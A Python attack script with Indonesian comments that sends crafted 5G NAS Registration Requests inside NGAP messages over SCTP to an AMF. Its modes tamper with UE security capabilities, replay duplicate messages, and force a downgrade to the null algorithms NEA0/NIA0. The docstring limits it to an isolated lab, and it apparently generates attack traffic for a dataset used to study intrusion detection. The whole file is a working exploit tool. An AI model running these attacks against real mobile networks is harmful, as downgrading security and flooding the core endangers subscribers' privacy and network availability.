#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Grup 2 — Serangan NAS (N1) di atas NGAP/SCTP (N2) → AMF.
Berjalan di SCTP: tokenisasi penuh baru jalan setelah patch SCTP di WSL
(INGEST_TRAIN_WSL.md). Tetap DI-CAPTURE sekarang di VM.

Mode:
  tamper_registration  Core-6  Registration Request dgn UE security capability
                               DIPALSUKAN (bit NEA/NIA diacak) → uji validasi AMF.
  replay               Core-7  Pesan NAS identik dikirim ULANG (duplikat) pada
                               koneksi berbeda → uji anti-replay.
  bidding_down         Core-8,22,gNB-12  UE security capability dipaksa hanya
                               NEA0/NIA0 (null cipher/integritas) → downgrade.

Tiap "session" = koneksi SCTP baru ke AMF (port efemeral baru) = 1 flow kanonik.

  python3 nas_attack.py <mode> <amf_n2_ip> [port]
Env (mode EPISODE):
  SESSIONS=<n>   jumlah flow independen (default 40)
Hanya LAB TERISOLASI. Guard subnet ditegakkan run_scenario.sh.
"""
import sys, os, time, random, socket

AMF_NGAP_PORT = 38412

# ── Template NAS 5GMM Registration Request (sintetis, cukup utk kapur/metadata) ──
# 7e 00 41 : EPD(5GMM) + sec-header(plain) + msg-type(Registration request)
# 79 00    : 5GS registration type + ngKSI
# 00 0b .. : 5GS mobile identity (SUCI) — isian placeholder
# <SECCAP> : UE security capability IE → 2e <len> <NEA> <NIA> [<EEA> <EIA>]
NAS_HEAD = bytes.fromhex("7e004179000b01020304050607080900")
def seccap_ie(nea, nia, eea=0x00, eia=0x00):
    return bytes([0x2e, 0x04, nea & 0xff, nia & 0xff, eea & 0xff, eia & 0xff])

# NGAP InitialUEMessage (procedureCode=15) — prefiks framing + NAS-PDU IE (id=38).
NGAP_PREFIX = bytes.fromhex("000f40")  # InitialUEMessage, ignore-criticality, len-mengikuti
NASPDU_IE   = bytes.fromhex("002600")  # IE id=38 (NAS-PDU), criticality, len-mengikuti

def build_nas(mode):
    if mode == "bidding_down":
        # Hanya NEA0/NIA0 (0x80 = algoritma indeks 0 di-set) → paksa null security.
        cap = seccap_ie(0x80, 0x80)
    elif mode == "tamper_registration":
        # Bit NEA/NIA diacak (kapabilitas dipalsukan) → tak konsisten dgn UE sah.
        cap = seccap_ie(random.randint(0, 255), random.randint(0, 255),
                        random.randint(0, 255), random.randint(0, 255))
    else:  # replay → kapabilitas normal (pesan sah yang di-replay)
        cap = seccap_ie(0xf0, 0xf0, 0xc0, 0xc0)
    return NAS_HEAD + cap

def wrap_ngap(nas):
    body = NASPDU_IE + bytes([len(nas) & 0xff]) + nas
    return NGAP_PREFIX + bytes([len(body) & 0xff]) + body

def sctp_send(target, port, payload, sport=None):
    """Satu koneksi SCTP + kirim payload. sport di-BIND eksplisit (unik) agar tiap
    koneksi = 1 flow kanonik berbeda — kernel kerap pakai-ulang port efemeral
    sehingga flow kolaps; bind eksplisit mencegahnya."""
    try:
        sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_SCTP)
    except Exception as e:
        print(f"[!] SCTP tak didukung kernel: {e}"); sys.exit(3)
    sk.settimeout(2)
    try:
        if sport is not None:
            sk.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            try: sk.bind(("", sport))
            except OSError: pass   # port sibuk → biarkan kernel pilih (jarang)
        sk.connect((target, port))
        sk.sendall(payload)
        try: sk.recv(256)
        except Exception: pass
        return True
    except Exception:
        return False
    finally:
        try: sk.close()
        except Exception: pass

def main():
    if len(sys.argv) < 3 or sys.argv[1] not in ("tamper_registration", "replay", "bidding_down"):
        print(__doc__); sys.exit(2)
    mode, target = sys.argv[1], sys.argv[2]
    port = int(sys.argv[3]) if len(sys.argv) > 3 else AMF_NGAP_PORT
    sessions = int(os.environ.get("SESSIONS", "40"))
    print(f"[NAS/{mode}] {sessions} koneksi SCTP → {target}:{port}")
    ok = 0
    # replay: satu payload tetap, dikirim ulang di tiap koneksi (duplikat).
    fixed = wrap_ngap(build_nas("replay")) if mode == "replay" else None
    lo = int(os.environ.get("SPORT_LO", "20000")); hi = int(os.environ.get("SPORT_HI", "60000"))
    used = set()
    for _ in range(sessions):
        sport = random.randint(lo, hi)
        while sport in used: sport = random.randint(lo, hi)   # port sumber unik → flow unik
        used.add(sport)
        payload = fixed if fixed is not None else wrap_ngap(build_nas(mode))
        if sctp_send(target, port, payload, sport):
            if mode == "replay":   # kirim DUA kali di koneksi sama → tekankan duplikasi
                sctp_send(target, port, payload, sport)
            ok += 1
        time.sleep(random.uniform(0.02, 0.06))
    print(f"[NAS/{mode}] selesai: {sessions} percobaan, {ok} koneksi SCTP terbentuk.")

if __name__ == "__main__":
    main()
